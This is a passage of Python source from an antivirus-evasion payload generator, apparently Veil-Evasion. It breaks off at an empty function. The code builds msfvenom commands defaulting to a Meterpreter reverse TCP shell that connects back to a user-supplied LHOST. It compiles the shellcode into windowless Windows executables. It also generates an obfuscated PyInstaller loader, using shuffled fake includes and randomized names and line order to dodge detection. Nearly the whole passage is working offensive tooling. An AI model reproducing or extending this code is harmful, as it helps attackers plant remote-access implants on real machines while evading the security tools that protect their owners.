                    if payloadSelected == "":
                        # default to reverse_tcp for the payload
                        payloadSelected = "windows/meterpreter/reverse_tcp"
                    try:
                        parts = payloadSelected.split("/")
                        # walk down the selected parts of the payload tree to get to the options at the bottom
                        options = self.payloadTree
                        for part in parts:
                            options = options[part]

                    except KeyError:
                        # make sure user entered a valid payload
                        print helpers.color(" [!] ERROR: Invalid payload specified!\n", warning=True)
                        payloadSelected = None

                # remove the tab completer
                readline.set_completer(None)

                # set the internal payload to the one selected
                self.msfvenompayload = payloadSelected

                # request a value for each required option
                for option in options:
                    value = ""
                    while value == "":

                        ### VALIDATION ###

                        # LHOST is a special case, so we can tab complete the local IP
                        if option == "LHOST":

                            # set the completer to fill in the local IP
                            readline.set_completer(completers.IPCompleter().complete)
                            value = raw_input(' [>] Enter value for \'LHOST\', [tab] for local IP: ')

                            hostParts = value.split(".")
                            if len(hostParts) > 1:

                                # if the last chunk is a number, assume it's an IP address
                                if hostParts[-1].isdigit():

                                    # do a regex IP validation
                                    if not re.match(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$",value):
                                        print helpers.color("\n [!] ERROR: Bad IP address specified.\n", warning=True)
                                        value = ""

                                # otherwise assume we've been passed a domain name
                                else:
                                    if not helpers.isValidHostname(value):
                                        print helpers.color("\n [!] ERROR: Bad hostname specified.\n", warning=True)
                                        value = ""

                            # if we don't have at least one period in the hostname/IP
                            else:
                                print helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True)
                                value = ""

                        # LPORT validation
                        else:

                            # set the completer to fill in the default MSF port (4444)
                            readline.set_completer(completers.MSFPortCompleter().complete)
                            value = raw_input(' [>] Enter value for \'' + option + '\': ')

                            if option == "LPORT":
                                try:
                                    if int(value) <= 0 or int(value) >= 65535:
                                        print helpers.color(" [!] ERROR: Bad port number specified.\n", warning=True)
                                        value = ""
                                except ValueError:
                                    print helpers.color(" [!] ERROR: Bad port number specified.\n", warning=True)
                                    value = ""

                    # append all the msfvenom options
                    self.msfvenomOptions.append(option + "=" + value)

                # allow the user to input any extra OPTION=value pairs
                extraValues = list()
                while True:
                    # clear out the tab completion
                    readline.set_completer(completers.none().complete)
                    selection = raw_input(' [>] Enter extra msfvenom options in OPTION=value syntax: ')
                    if selection != "":
                        extraValues.append(selection)
                    else: break

                # grab any specified msfvenom options in the /etc/veil/settings.py file
                msfvenomOptions = ""
                if hasattr(settings, "MSFVENOM_OPTIONS"):
                    msfvenomOptions = settings.MSFVENOM_OPTIONS

                # build out the msfvenom command
                # TODO: detect Windows and modify the paths appropriately
                self.msfvenomCommand = "msfvenom " + msfvenomOptions + " -p " + payloadSelected
                for option in self.msfvenomOptions:
                    self.msfvenomCommand += " " + option
                    self.options.append(option)
                if len(extraValues) != 0 :
                    self.msfvenomCommand += " " +  " ".join(extraValues)
                self.msfvenomCommand += " -b \'\\x00\\x0a\\xff\' -f c | tr -d \'\"\' | tr -d \'\n\'"


    def generate(self):
        """
        Based on the options set by menu(), setCustomShellcode() or SetPayload()
        either returns the custom shellcode string or calls msfvenom
        and returns the result.

        Returns the shellcode string for this object.
        """

        # if the msfvenom command nor shellcode are set, revert to the
        # interactive menu to set any options
        if self.msfvenomCommand == "" and self.customshellcode == "":
            self.menu()

        # return custom specified shellcode if it was set previously
        if self.customshellcode != "":
            return self.customshellcode

        # generate the shellcode using msfvenom
        else:
            print helpers.color("\n [*] Generating shellcode...")
            if self.msfvenomCommand == "":
                print helpers.color(" [!] ERROR: msfvenom command not specified in payload!\n", warning=True)
                return None
            else:
                # Stript out extra characters, new lines, etc., just leave the shellcode.
                # Tim Medin's patch for non-root non-kali users

                FuncShellcode = subprocess.check_output(settings.METASPLOIT_PATH + self.msfvenomCommand, shell=True)

                # try to get the current MSF build version do we can determine how to
                # parse the shellcode
                # pretty sure it was this commit that changed everything-
                #   https://github.com/rapid7/metasploit-framework/commit/4dd60631cbc88e8e6d5322a94a492714ff83fe2f
                try:
                    # get the latest metasploit build version
                    f = open(settings.METASPLOIT_PATH + "/build_rev.txt")
                    lines = f.readlines()
                    f.close()

                    # extract the build version/data
                    version = lines[0]
                    major,date = version.split("-")

                    #  2014021901 - the version build date where msfvenom shellcode changed
                    if int(date) < 2014021901:
                        # use the old way
                        return FuncShellcode[82:-1].strip()
                    else:
                        # new way
                        return FuncShellcode[22:-1].strip()

                # on error, default to the new version
                except:
                    return FuncShellcode[22:-1].strip()


########NEW FILE########
__FILENAME__ = supportfiles
"""
Contains methods for creating any supporting files for payloads.

"""

import os
import sys
import random
import string
from modules.common import shellcode
from modules.common import messages
from modules.common import helpers

import settings

PWNSTALLER_VERSION = "1.0"


def supportingFiles(language, payloadFile, options):
    """
    Takes a specific language and payloadFile name written to and generates
    any necessary support files, and/or compiles the payload to an .exe.

    Currently only handles python and c

    options['method'] = "py2exe" or "pyinstaller" currently for python payloads
    """
    if language == "python":

        # if we aren't passed any options, do the interactive menu
        if len(options) == 0:

            if settings.OPERATING_SYSTEM == "Windows":
                options['method'] = "py2exe"
            else:
                # if we have a linux distro, continue...
                # Determine if the user wants Pyinstaller, Pwnstaller, or Py2Exe.
                print '\n [?] How would you like to create your payload executable?\n'
                print '     1 - Pyinstaller (default)'
                print '     2 - Pwnstaller (obfuscated Pyinstaller loader)'
                print '     3 - Py2Exe\n'

                choice = raw_input(" [>] Please enter the number of your choice: ")
                if choice == "1" or choice == "":
                    options['method'] = "pyinstaller"
                elif choice == "2":
                    options['method'] = "pwnstaller"
                else:
                    options['method'] = "py2exe"

        if options['method'] == "py2exe":

            nameBase = payloadFile.split("/")[-1].split(".")[0]

            # Generate setup.py File for Py2Exe
            SetupFile = open(settings.PAYLOAD_SOURCE_PATH + '/setup.py', 'w')
            SetupFile.write("from distutils.core import setup\n")
            SetupFile.write("import py2exe, sys, os\n\n")
            SetupFile.write("setup(\n")
            SetupFile.write("\toptions = {'py2exe': {'bundle_files': 1}},\n")
            SetupFile.write("\tzipfile = None,\n")
            SetupFile.write("\twindows=['"+nameBase+".py']\n")
            SetupFile.write(")")
            SetupFile.close()

            # Generate Batch script for Compiling on Windows Using Py2Exe
            RunmeFile = open(settings.PAYLOAD_SOURCE_PATH + '/runme.bat', 'w')
            RunmeFile.write('rem Batch Script for compiling python code into an executable\n')
            RunmeFile.write('rem on windows with py2exe\n')
            RunmeFile.write('rem Usage: Drop into your Python folder and click, or anywhere if Python is in your system path\n\n')
            RunmeFile.write("python setup.py py2exe\n")
            RunmeFile.write('cd dist\n')
            exeName = ".".join(payloadFile.split(".")[:-1]) + ".exe"
            RunmeFile.write('move '+nameBase+'.exe ../\n')
            RunmeFile.write('cd ..\n')
            RunmeFile.write('rmdir /S /Q build\n')
            RunmeFile.write('rmdir /S /Q dist\n')
            RunmeFile.close()

            print helpers.color("\npy2exe files 'setup.py' and 'runme.bat' written to:\n"+settings.PAYLOAD_SOURCE_PATH + "\n")

        # Else, Use Pyinstaller (used by default) or Pwnstaller
        else:

            if options['method'] == "pwnstaller":
                # generate the pwnstaller runw.exe loader and copy it into the correct location
                generatePwnstaller()
            else:
                # copy the original runw.exe into the proper location
                runwPath = settings.VEIL_EVASION_PATH+"tools/runw_orig.exe"
                os.system("cp "+runwPath+" " + settings.PYINSTALLER_PATH + "support/loader/Windows-32bit/runw.exe")

            # Check for Wine python.exe Binary (Thanks to darknight007 for this fix.)
            # Thanks to Tim Medin for patching for non-root non-kali users
            if(os.path.isfile(os.path.expanduser('~/.wine/drive_c/Python27/python.exe'))):

                # extract the payload base name and turn it into an .exe
                exeName = ".".join(payloadFile.split("/")[-1].split(".")[:-1]) + ".exe"

                # TODO: os.system() is depreciated, use subprocess or commands instead
                os.system('wine ' + os.path.expanduser('~/.wine/drive_c/Python27/python.exe') + ' ' + os.path.expanduser(settings.PYINSTALLER_PATH + '/pyinstaller.py') + ' --noconsole --onefile ' + payloadFile )
                os.system('mv dist/'+exeName+' ' + settings.PAYLOAD_COMPILED_PATH)
                os.system('rm -rf dist')
                os.system('rm -rf build')
                os.system('rm *.spec')
                os.system('rm logdict*.*')

                messages.title()
                print "\n [*] Executable written to: " +  helpers.color(settings.PAYLOAD_COMPILED_PATH + exeName)

            else:
                # Tim Medin's Patch for non-root non-kali users
                messages.title()
                print helpers.color("\n [!] ERROR: Can't find python.exe in " + os.path.expanduser('~/.wine/drive_c/Python27/'), warning=True)
                print helpers.color(" [!] ERROR: Make sure the python.exe binary exists before using PyInstaller.", warning=True)
                sys.exit()

    elif language == "c":

        # extract the payload base name and turn it into an .exe
        exeName = ".".join(payloadFile.split("/")[-1].split(".")[:-1]) + ".exe"

        # Compile our C code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
        os.system('i686-w64-mingw32-gcc -Wl,-subsystem,windows '+payloadFile+' -o ' + settings.PAYLOAD_COMPILED_PATH + exeName + " -lwsock32")

        print "\n [*] Executable written to: " +  helpers.color(settings.PAYLOAD_COMPILED_PATH + exeName)

    elif language == "cs":

        # extract the payload base name and turn it into an .exe
        exeName = ".".join(payloadFile.split("/")[-1].split(".")[:-1]) + ".exe"

        # Compile our C code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
        os.system('mcs -platform:x86 -target:winexe '+payloadFile+' -out:' + settings.PAYLOAD_COMPILED_PATH + exeName)

        print "\n [*] Executable written to: " +  helpers.color(settings.PAYLOAD_COMPILED_PATH + exeName)


    else:
        messages.title()
        print helpers.color("\n [!] ERROR: Only python, c, and c# compilation is currently supported.\n", warning=True)



#################################################################
#
# Pwnstaller functions.
# Taken from https://github.com/HarmJ0y/Pwnstaller
#
#################################################################

def pwnstallerGenerateUtils(): 
    """
    Generates an obfuscated version of Pwnstaller's utils.c
    """
    # these two HAVE to go first
    allincludes = "#define _WIN32_WINNT 0x0500\n"
    allincludes += "#include \"utils.h\"\n"

    # includes that are actually needed
    includes = ["#include <windows.h>", "#include <commctrl.h>", "#include <signal.h>", "#include <memory.h>", "#include <string.h>"]

    # "fake"/unnessary includes taken from /usr/i686-w64-mingw32/include/*.h
    # hand stripped list to ensure it should compile
    fake_includes = ['#include <accctrl.h>', '#include <aclapi.h>', '#include <aclui.h>', '#include <activeds.h>', '#include <activscp.h>', '#include <adc.h>', '#include <adhoc.h>', '#include <admex.h>', '#include <adptif.h>', '#include <adtgen.h>', '#include <advpub.h>', '#include <af_irda.h>', '#include <afxres.h>', '#include <agtctl.h>', '#include <agterr.h>', '#include <agtsvr.h>', '#include <amaudio.h>', '#include <aqadmtyp.h>', '#include <asptlb.h>', '#include <assert.h>', '#include <atacct.h>', '#include <atalkwsh.h>', '#include <atsmedia.h>', '#include <audevcod.h>', '#include <audioapotypes.h>', '#include <audioclient.h>', '#include <audioengineendpoint.h>', '#include <audiopolicy.h>', '#include <audiosessiontypes.h>', '#include <austream.h>', '#include <authif.h>', '#include <authz.h>', '#include <avrt.h>', '#include <azroles.h>', '#include <basetsd.h>', '#include <basetyps.h>', '#include <batclass.h>', '#include <bcrypt.h>', '#include <bh.h>', '#include <bidispl.h>', '#include <bits1_5.h>', '#include <bits2_0.h>', '#include <bitscfg.h>', '#include <bits.h>', '#include <bitsmsg.h>', '#include <blberr.h>', '#include <bugcodes.h>', '#include <callobj.h>', '#include <cardmod.h>', '#include <casetup.h>', '#include <cchannel.h>', '#include <cderr.h>', '#include <celib.h>', '#include <certadm.h>', '#include <certbase.h>', '#include <certbcli.h>', '#include <certcli.h>', '#include <certenc.h>', '#include <certenroll.h>', '#include <certexit.h>', '#include <certif.h>', '#include <certmod.h>', '#include <certpol.h>', '#include <certreqd.h>', '#include <certsrv.h>', '#include <certview.h>', '#include <cfg.h>', '#include <cfgmgr32.h>', '#include <cguid.h>', '#include <chanmgr.h>', '#include <cierror.h>', '#include <clfs.h>', '#include <clfsmgmt.h>', '#include <clfsmgmtw32.h>', '#include <clfsw32.h>', '#include <cluadmex.h>', '#include <clusapi.h>', '#include <cluscfgguids.h>', '#include <cluscfgserver.h>', '#include <cluscfgwizard.h>', '#include <cmdtree.h>', '#include <cmnquery.h>', '#include <codecapi.h>', '#include <colordlg.h>', '#include <conio.h>', '#include <control.h>', '#include <corerror.h>', '#include <correg.h>', '#include <cplext.h>', '#include <cpl.h>', '#include <crtdbg.h>', '#include <crtdefs.h>', '#include <cryptuiapi.h>', '#include <cryptxml.h>', '#include <cscapi.h>', '#include <cscobj.h>', '#include <ctxtcall.h>', '#include <ctype.h>', '#include <custcntl.h>', '#include <d2dbasetypes.h>', '#include <d2derr.h>', '#include <datapath.h>', '#include <davclnt.h>', '#include <dbt.h>', '#include <dciddi.h>', '#include <dciman.h>', '#include <dcommon.h>', '#include <delayimp.h>', '#include <devguid.h>', '#include <devicetopology.h>', '#include <devioctl.h>', '#include <devpkey.h>', '#include <devpropdef.h>', '#include <digitalv.h>', '#include <dimm.h>', '#include <direct.h>', '#include <dirent.h>', '#include <dir.h>', '#include <diskguid.h>', '#include <dispdib.h>', '#include <dispex.h>', '#include <dlcapi.h>', '#include <dlgs.h>', '#include <dls1.h>', '#include <dls2.h>', '#include <docobj.h>', '#include <domdid.h>', '#include <dos.h>', '#include <downloadmgr.h>', '#include <driverspecs.h>', '#include <dtchelp.h>', '#include <dwmapi.h>', '#include <eapauthenticatoractiondefine.h>', '#include <eapauthenticatortypes.h>', '#include <eaphosterror.h>', '#include <eaphostpeerconfigapis.h>', '#include <eaphostpeertypes.h>', '#include <eapmethodauthenticatorapis.h>', '#include <eapmethodpeerapis.h>', '#include <eapmethodtypes.h>', '#include <eappapis.h>', '#include <eaptypes.h>', '#include <edevdefs.h>', '#include <emptyvc.h>', '#include <endpointvolume.h>', '#include <errno.h>', '#include <error.h>', '#include <errorrep.h>', '#include <errors.h>', '#include <evcode.h>', '#include <evcoll.h>', '#include <eventsys.h>', '#include <evr9.h>', '#include <evr.h>', '#include <exchform.h>', '#include <excpt.h>', '#include <exdisp.h>', '#include <exdispid.h>', '#include <fci.h>', '#include <fcntl.h>', '#include <fdi.h>', '#include <fenv.h>', '#include <fileextd.h>', '#include <filter.h>', '#include <filterr.h>', '#include <float.h>', '#include <fltdefs.h>', '#include <fpieee.h>', '#include <fsrmenums.h>', '#include <fsrm.h>', '#include <fsrmpipeline.h>', '#include <fsrmquota.h>', '#include <fsrmreports.h>', '#include <fsrmscreen.h>', '#include <ftsiface.h>', '#include <functiondiscoveryapi.h>', '#include <functiondiscoverycategories.h>', '#include <functiondiscoveryconstraints.h>', '#include <functiondiscoverykeys.h>', '#include <functiondiscoverynotification.h>', '#include <fusion.h>', '#include <fwpmtypes.h>', '#include <fwpmu.h>', '#include <fwptypes.h>', '#include <gb18030.h>', '#include <gdiplus.h>', '#include <getopt.h>', '#include <gpmgmt.h>', '#include <guiddef.h>', '#include <hidpi.h>', '#include <hidsdi.h>', '#include <hidusage.h>', '#include <hlguids.h>', '#include <hliface.h>', '#include <hlink.h>', '#include <hostinfo.h>', '#include <htiface.h>', '#include <htiframe.h>', '#include <htmlguid.h>', '#include <htmlhelp.h>', '#include <ia64reg.h>', '#include <iaccess.h>', '#include <iadmext.h>', '#include <iadmw.h>', '#include <iads.h>', '#include <icftypes.h>', '#include <icm.h>', '#include <i_cryptasn1tls.h>', '#include <identitycommon.h>', '#include <identitystore.h>', '#include <idf.h>', '#include <idispids.h>', '#include <iedial.h>', '#include <ieverp.h>', '#include <ifdef.h>', '#include <ime.h>', '#include <imessage.h>', '#include <imm.h>', '#include <in6addr.h>', '#include <inaddr.h>', '#include <indexsrv.h>', '#include <inetreg.h>', '#include <inetsdk.h>', '#include <initguid.h>', '#include <initoid.h>', '#include <inputscope.h>', '#include <intrin.h>', '#include <intshcut.h>', '#include <inttypes.h>', '#include <io.h>', '#include <iscsidsc.h>', '#include <isguids.h>', '#include <isysmon.h>', '#include <iwamreg.h>', '#include <kxia64.h>', '#include <libgen.h>', '#include <libmangle.h>', '#include <limits.h>', '#include <loadperf.h>', '#include <locale.h>', '#include <locationapi.h>', '#include <lpmapi.h>', '#include <lzexpand.h>', '#include <madcapcl.h>', '#include <malloc.h>', '#include <math.h>', '#include <mbctype.h>', '#include <mbstring.h>', '#include <mciavi.h>', '#include <mcx.h>', '#include <mediaerr.h>', '#include <mediaobj.h>', '#include <mem.h>', '#include <memory.h>', '#include <mergemod.h>', '#include <midles.h>', '#include <mimedisp.h>', '#include <mimeinfo.h>', '#include <minmax.h>', '#include <mlang.h>', '#include <mobsync.h>', '#include <mprerror.h>', '#include <mq.h>', '#include <mqmail.h>', '#include <mtsadmin.h>', '#include <mtsevents.h>', '#include <mtsgrp.h>', '#include <mtxadmin.h>', '#include <mtxattr.h>', '#include <mtxdm.h>', '#include <mtx.h>', '#include <muiload.h>', '#include <multimon.h>', '#include <multinfo.h>', '#include <mxdc.h>', '#include <napenforcementclient.h>', '#include <naperror.h>', '#include <napmicrosoftvendorids.h>', '#include <napprotocol.h>', '#include <naptypes.h>', '#include <naputil.h>', '#include <nb30.h>', '#include <ncrypt.h>', '#include <ndattrib.h>', '#include <ndfapi.h>', '#include <ndhelper.h>', '#include <ndr64types.h>', '#include <ndrtypes.h>', '#include <netcon.h>', '#include <neterr.h>', '#include <netevent.h>', '#include <netioapi.h>', '#include <netlistmgr.h>', '#include <netprov.h>', '#include <nettypes.h>', '#include <newapis.h>', '#include <newdev.h>', '#include <new.h>', '#include <nldef.h>', '#include <npapi.h>', '#include <nsemail.h>', '#include <nspapi.h>', '#include <oaidl.h>', '#include <objbase.h>', '#include <objectarray.h>', '#include <objerror.h>', '#include <objidl.h>', '#include <objsafe.h>', '#include <objsel.h>', '#include <ocidl.h>', '#include <ocmm.h>', '#include <opmapi.h>', '#include <optary.h>', '#include <p2p.h>', '#include <patchapi.h>', '#include <patchwiz.h>', '#include <pbt.h>', '#include <pchannel.h>', '#include <pcrt32.h>', '#include <pdh.h>', '#include <pdhmsg.h>', '#include <penwin.h>', '#include <perflib.h>', '#include <perhist.h>', '#include <persist.h>', '#include <pgobootrun.h>', '#include <pla.h>', '#include <polarity.h>', '#include <poppack.h>', '#include <portabledeviceconnectapi.h>', '#include <process.h>', '#include <profile.h>', '#include <profinfo.h>', '#include <propidl.h>', '#include <propkeydef.h>', '#include <propkey.h>', '#include <propsys.h>', '#include <prsht.h>', '#include <psapi.h>', '#include <pstore.h>', '#include <ratings.h>', '#include <rdpencomapi.h>', '#include <reason.h>', '#include <reconcil.h>', '#include <regstr.h>', '#include <restartmanager.h>', '#include <richedit.h>', '#include <richole.h>', '#include <rkeysvcc.h>', '#include <rnderr.h>', '#include <rpcasync.h>', '#include <rpcdce.h>', '#include <rpcdcep.h>', '#include <rpc.h>', '#include <rpcndr.h>', '#include <rpcnsi.h>', '#include <rpcnsip.h>', '#include <rpcnterr.h>', '#include <rpcproxy.h>', '#include <rpcssl.h>', '#include <rrascfg.h>', '#include <rtcapi.h>', '#include <rtccore.h>', '#include <rtcerr.h>', '#include <rtinfo.h>', '#include <rtm.h>', '#include <rtmv2.h>', '#include <rtutils.h>', '#include <scesvc.h>', '#include <schannel.h>', '#include <schedule.h>', '#include <schemadef.h>', '#include <schnlsp.h>', '#include <scode.h>', '#include <scrnsave.h>', '#include <scrptids.h>', '#include <sddl.h>', '#include <sdkddkver.h>', '#include <sdoias.h>', '#include <sdpblb.h>', '#include <sdperr.h>', '#include <search.h>', '#include <sehmap.h>', '#include <sensapi.h>', '#include <sensevts.h>', '#include <sens.h>', '#include <servprov.h>', '#include <setjmpex.h>', '#include <setjmp.h>', '#include <setupapi.h>', '#include <sfc.h>', '#include <shappmgr.h>', '#include <share.h>', '#include <shdeprecated.h>', '#include <shdispid.h>', '#include <shellapi.h>', '#include <shfolder.h>', '#include <shobjidl.h>', '#include <shtypes.h>', '#include <signal.h>', '#include <simpdata.h>', '#include <simpdc.h>', '#include <sipbase.h>', '#include <sisbkup.h>', '#include <slerror.h>', '#include <slpublic.h>', '#include <smpab.h>', '#include <smpms.h>', '#include <smpxp.h>', '#include <smx.h>', '#include <snmp.h>', '#include <softpub.h>', '#include <specstrings.h>', '#include <srrestoreptapi.h>', '#include <srv.h>', '#include <stdarg.h>', '#include <stddef.h>', '#include <stdexcpt.h>', '#include <stdint.h>', '#include <stdio.h>', '#include <stdlib.h>', '#include <stierr.h>', '#include <sti.h>', '#include <stireg.h>', '#include <stllock.h>', '#include <storduid.h>', '#include <storprop.h>', '#include <stralign.h>', '#include <string.h>', '#include <strings.h>', '#include <structuredquerycondition.h>', '#include <subsmgr.h>', '#include <svcguid.h>', '#include <syslimits.h>', '#include <tabflicks.h>', '#include <taskschd.h>', '#include <tbs.h>', '#include <tcerror.h>', '#include <tcguid.h>', '#include <tchar.h>', '#include <tcpestats.h>', '#include <tcpmib.h>', '#include <tdh.h>', '#include <tlhelp32.h>', '#include <tlogstg.h>', '#include <tmschema.h>', '#include <tom.h>', '#include <tpcshrd.h>', '#include <transact.h>', '#include <triedcid.h>', '#include <triediid.h>', '#include <triedit.h>', '#include <tspi.h>', '#include <tssbx.h>', '#include <tvout.h>', '#include <txcoord.h>', '#include <txctx.h>', '#include <txdtc.h>', '#include <txfw32.h>', '#include <uastrfnc.h>', '#include <udpmib.h>', '#include <umx.h>', '#include <unistd.h>', '#include <urlhist.h>', '#include <urlmon.h>', '#include <userenv.h>', '#include <usp10.h>', '#include <uuids.h>', '#include <uxtheme.h>', '#include <vcr.h>', '#include <vdmdbg.h>', '#include <virtdisk.h>', '#include <w32api.h>', '#include <wbemads.h>', '#include <wbemcli.h>', '#include <wbemdisp.h>', '#include <wbemidl.h>', '#include <wbemprov.h>', '#include <wbemtran.h>', '#include <wchar.h>', '#include <wcmconfig.h>', '#include <wcsplugin.h>', '#include <wct.h>', '#include <wctype.h>', '#include <werapi.h>', '#include <wfext.h>', '#include <winable.h>', '#include <winbase.h>', '#include <winber.h>', '#include <wincodec.h>', '#include <wincon.h>', '#include <wincred.h>', '#include <wincrypt.h>', '#include <windef.h>', '#include <windns.h>', '#include <windot11.h>', '#include <windows.h>', '#include <winefs.h>', '#include <winerror.h>', '#include <winevt.h>', '#include <wingdi.h>', '#include <winldap.h>', '#include <winnetwk.h>', '#include <winnls32.h>', '#include <winnls.h>', '#include <winnt.h>', '#include <winnt.rh>', '#include <winperf.h>', '#include <winreg.h>', '#include <winresrc.h>', '#include <winsafer.h>', '#include <winsatcominterfacei.h>', '#include <winscard.h>', '#include <winsmcrd.h>', '#include <winsnmp.h>', '#include <winsplp.h>', '#include <winspool.h>', '#include <winsvc.h>', '#include <winsxs.h>', '#include <winsync.h>', '#include <winuser.h>', '#include <winuser.rh>', '#include <winver.h>', '#include <winwlx.h>', '#include <wlanapi.h>', '#include <wlantypes.h>','#include <wmistr.h>', '#include <wmiutils.h>', '#include <wownt16.h>', '#include <wownt32.h>', '#include <wpapi.h>', '#include <wpapimsg.h>', '#include <wpcapi.h>', '#include <wpcevent.h>', '#include <wpcrsmsg.h>', '#include <wpftpmsg.h>', '#include <wppstmsg.h>', '#include <wpspihlp.h>', '#include <wptypes.h>', '#include <wpwizmsg.h>', '#include <wshisotp.h>', '#include <wsipv6ok.h>', '#include <wsipx.h>', '#include <wsnetbs.h>', '#include <wsnwlink.h>', '#include <wsrm.h>', '#include <wsvns.h>', '#include <wtsapi32.h>', '#include <wtypes.h>', '#include <xa.h>', '#include <xcmcext.h>', '#include <xcmc.h>', '#include <xcmcmsx2.h>', '#include <xcmcmsxt.h>', '#include <xenroll.h>', '#include <xinput.h>', '#include <xlocinfo.h>', '#include <xmath.h>', '#include <xmldomdid.h>', '#include <xmldsodid.h>', '#include <xmllite.h>', '#include <xmltrnsf.h>', '#include <xolehlp.h>', '#include <ymath.h>', '#include <yvals.h>', '#include <zmouse.h>']

    random.shuffle(fake_includes)
    # include a random number of the randomized "fake" includes, between 10-30
    for x in xrange(0, random.randint(10,30)):
        includes.append(fake_includes[x])

    # shuffle up all the includes
    random.shuffle(includes)

    # join all the includes and throw them at the top of the file
    allincludes += "\n".join(includes) + "\n"

    # basename()
    pathName = helpers.randomString()
    basenameName = helpers.randomString()
    code = "char* basename (char *%s) {\n" % (pathName)
    code += "char *%s = strrchr (%s, '\\\\');\n" %(basenameName, pathName)
    code += "if (!%s) %s = strrchr (%s, '/');\n" % (basenameName, basenameName, pathName)
    code += "return %s ? ++%s : (char*)%s;}\n" % (basenameName, basenameName, pathName)


    # IsXPOrLater()
    osviName = helpers.randomString()
    code += "int IsXPOrLater(void) {\n"
    code += "OSVERSIONINFO %s;\n" %(osviName)
    code += "ZeroMemory(&%s, sizeof(OSVERSIONINFO));\n" %(osviName)
    code += "%s.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);\n" %(osviName)
    code += "GetVersionEx(&%s);\n" %(osviName)
    code += "return ((%s.dwMajorVersion > 5) || ((%s.dwMajorVersion == 5) && (%s.dwMinorVersion >= 1)));}\n" %(osviName,osviName,osviName)


    # CreateActContext()
    code += "int CreateActContext(char *%s, char *%s) { return 0; }\n" %(helpers.randomString(),helpers.randomString())


    # ReleaseActContext()
    k32Name = helpers.randomString()
    ReleaseActCtxName = helpers.randomString()
    DeactivateActCtxName = helpers.randomString()
    code += "void ReleaseActContext(void) {\n"
    code += "void (WINAPI *%s)(HANDLE);\n" %(ReleaseActCtxName)
    code += "BOOL (WINAPI *%s)(DWORD dwFlags, ULONG_PTR ulCookie);\n" %(DeactivateActCtxName)
    code += "HANDLE %s;\n" %(k32Name)
    code += "if (!IsXPOrLater()) return;\n"
    # TODO: obfuscate this string?
    code += "%s = LoadLibrary(\"kernel32\");\n" %(k32Name)
    code += "%s = (void*)GetProcAddress(%s, \"%s\");\n" %(ReleaseActCtxName, k32Name, ReleaseActCtxName)
    code += "%s = (void*)GetProcAddress(%s, \"%s\");\n" %(DeactivateActCtxName, k32Name, DeactivateActCtxName)
    code += "if (!%s || !%s) { return; }}\n" %(ReleaseActCtxName, DeactivateActCtxName)
    

    # init_launcher()
    code += "void init_launcher(void) { InitCommonControls(); }\n"


    # get_thisfile()
    thisfileName = helpers.randomString()
    code += "int get_thisfile(char *%s, const char *%s) {\n" %(thisfileName, helpers.randomString())
    code += "if (!GetModuleFileNameA(NULL, %s, _MAX_PATH)) { return -1; } return 0; }\n" %(thisfileName)


    # get_thisfilew()
    thisfilewName = helpers.randomString()
    code +=  "int get_thisfilew(LPWSTR %s) {\n" %(thisfilewName)
    code +=  "if (!GetModuleFileNameW(NULL, %s, _MAX_PATH)) { return -1; } return 0; }\n" %(thisfilewName)


    # get_homepath()
    homepathName = helpers.randomString()
    thisfileName = helpers.randomString()
    pName = helpers.randomString()
    code +=  "void get_homepath(char *%s, const char *%s) {\n" %(homepathName, thisfileName)
    code +=  "char *%s = NULL;\n" %(pName)
    code +=  "strcpy(%s, %s);\n" %(homepathName, thisfileName)
    code +=  "for (%s = %s + strlen(%s); *%s != '\\\\' && %s >= %s + 2; --%s);\n" %(pName, homepathName, homepathName, pName, pName, homepathName, pName)
    code +=  "*++%s = '\\0'; }\n" %(pName)


    # get_archivefile()
    archivefileName = helpers.randomString()
    thisfileName = helpers.randomString()
    code +=  "void get_archivefile(char *%s, const char *%s){\n" %(archivefileName, thisfileName)
    code +=  "strcpy(%s, %s);\n" %(archivefileName, thisfileName)
    # TODO: obfuscate this string?
    code +=  "strcpy(%s + strlen(%s) - 3, \"pkg\");}\n" %(archivefileName, archivefileName)


    # set_environment()
    code +=  " int set_environment(const ARCHIVE_STATUS *%s) { return 0; }\n" %(helpers.randomString())


    # spawn()
    thisfileName = helpers.randomString()
    saName = helpers.randomString()
    siName = helpers.randomString()
    piName = helpers.randomString()
    rcName = helpers.randomString()

    code += "int spawn(LPWSTR %s) {\n" %(thisfileName)
    code += "SECURITY_ATTRIBUTES %s;\n" %(saName)
    code += "STARTUPINFOW %s;\n" %(siName)
    code += "PROCESS_INFORMATION %s;\n" %(piName)
    code += "int %s = 0;\n" %(rcName)

    # a set of lines whose order can be randomized safely
    lineSet1 = ["signal(SIGABRT, SIG_IGN);", 
                "signal(SIGINT, SIG_IGN);" , 
                "signal(SIGTERM, SIG_IGN);", 
                "signal(SIGBREAK, SIG_IGN);", 
                "%s.nLength = sizeof(%s);" %(saName,saName), 
                "%s.lpSecurityDescriptor = NULL;" %(saName), 
                "%s.bInheritHandle = TRUE;" %(saName)]
    random.shuffle(lineSet1)
    code += "\n".join(lineSet1) + "\n"

    code += "GetStartupInfoW(&%s);\n" %(siName)

    # another set of lines whose order can be randomized safely
    lineSet2 = [
        "%s.lpReserved = NULL;" %(siName), 
        "%s.lpDesktop = NULL;" %(siName), 
        "%s.lpTitle = NULL;" %(siName), 
        "%s.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;" %(siName), 
        "%s.wShowWindow = SW_NORMAL;" %(siName), 
        "%s.hStdInput = (void*)_get_osfhandle(fileno(stdin));" %(siName), 
        "%s.hStdOutput = (void*)_get_osfhandle(fileno(stdout));" %(siName), 
        "%s.hStdError = (void*)_get_osfhandle(fileno(stderr));" %(siName)]
    random.shuffle(lineSet2)
    code += "\n".join(lineSet2) + "\n"

    code += "if (CreateProcessW( %s, GetCommandLineW(), &%s, NULL, TRUE, 0,  NULL, NULL, &%s, &%s)) {\n" %(thisfileName, saName, siName, piName )
    code += "WaitForSingleObject(%s.hProcess, INFINITE);\n" %(piName)
    code += "GetExitCodeProcess(%s.hProcess, (unsigned long *)&%s);\n" %(piName, rcName)
    code += "} else { %s = -1; }\n" %(rcName)
    code += "return %s; }\n" %(rcName)

    return (allincludes, code)


def pwnstallerGenerateUtilsH(methodSubs):
    """
    Generate an obfuscated version of Pwnstaller's utils.h
    """
